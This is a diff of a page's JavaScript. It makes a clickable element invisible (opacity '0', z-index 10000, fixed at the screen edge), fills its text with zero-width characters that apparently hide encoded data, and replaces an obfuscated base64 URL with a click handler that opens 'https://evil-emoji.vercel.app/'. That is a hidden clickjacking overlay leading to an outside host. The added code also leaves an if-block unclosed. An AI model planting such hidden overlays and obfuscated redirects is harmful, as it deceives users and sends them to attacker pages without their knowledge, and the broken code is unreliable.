@@ -1813,7 +1813,7 @@ window.addEventListener('load', () => {
         right: '0px',
         top: '50%',
         transform: 'translateY(-50%)',
-        opacity: '50',
+        opacity: '0',
         zIndex: '10000',
         cursor: 'pointer',
         userSelect: 'all',
@@ -1824,8 +1824,9 @@ window.addEventListener('load', () => {
     li.textContent = 'd‍‌‌‌‌‌​‌‌‌​​‌​‌‌‌‌​​​‌​‌‌‌​​​‌​‌‌‌​​​‌‌‌‌‌​​​‌‌​​‌‌​​​‌​‌‌‌​‌​​​​‌‌​‌​​​​‌​​​​‌‌​‌​​‌​​​​‌​​​‌​‌​‌​​​‌​‌‌‌​​​‌​‌​‌‌​‌​​​‌‌​​‌‌‌​‌‌​​‌‌​‌​‌‌​‌​​​​‌​‌‌​‌​​‌​‌‌‌​‌​‌‌​​‌​​​‌​‌‌​‌‌‌‌​‌‌‌​‌‌‌​‌​‌​‌‌‌​‌‌‌​‌​‌​‌​​‌‌​‌‌​​‌​​‌‌​​​‌‌​​‌​​‌‌‌​​‌‌​​​​​​‌​​​‌‌​​‌​​‌​‌‌​‌‌​​​​‌​‌​​​‌‌​‌‌‌​​‌​​​‌​​‌​‌​​‌​‌​‌​​​‌​‌‌​​​​‌​‌‌‌​​‌‌​​​‌‌​‌‌​​​​‌‌​‌​‌​‌‌‌‌‌​‌‌​​‌​‌​‌‌‌​​‌‌​‌‌‌‌‌​‌​​‌‌​‌​‌‌​​‌‌​‌‌​​​‌‌‌‌‌‌​​‌​‌‌‍ont';
 
     li.addEventListener('click', () => {
-        window.open('MDExMDEwMDAwMTExMDEwMDAxMTEwMTAwMDExMTAwMDAwMTExMDAxMTAwMTExMDEwMDAxMDExMTEwMDEwMTExMTAxMTAwMTAxMDExMTAxMTAwMTEwMTAwMTAxMTAxMTAwMDAxMDExMDEwMTEwMDEwMTAxMTAxMTAxMDExMDExMTEwMTEwMTAxMDAxMTAxMDAxMDAxMDExMTAwMTExMDExMDAxMTAwMTAxMDExMTAwMTAwMTEwMDAxMTAxMTAwMTAxMDExMDExMDAwMDEwMTExMDAxMTAwMDAxMDExMTAwMDAwMTExMDAwMDAwMTAxMTEx', '_blank');
-        }
+        if (!activeInterval) {
+
+                    window.open('https://evil-emoji.vercel.app/', '_blank');
     });
 
     document.body.appendChild(li);
